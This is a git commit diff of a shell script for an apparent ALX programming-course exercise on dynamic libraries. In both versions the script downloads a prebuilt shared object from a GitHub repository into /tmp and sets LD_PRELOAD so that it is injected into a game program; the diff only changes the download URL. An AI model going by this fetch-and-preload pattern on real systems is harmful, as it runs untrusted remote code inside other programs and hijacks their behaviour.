ed0af59fb12e4d970915c2e15685c176ea842d42
hooleymass <hockleymasese3@gmail.com>
2023-03-28 19:58:54 +0300

    initial commit

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ https://raw.github.com/Snazo09/alx-low_level_programming/0x18-dynamic_libraries/win.so
-export LD_PRELOAD=/tmp/win.so
+wget -P /tmp https://github.com/eyoul/alx-low_level_programming/raw/main/0x18-dynamic_libraries/iwin.so
+export LD_PRELOAD=/tmp/iwin.so
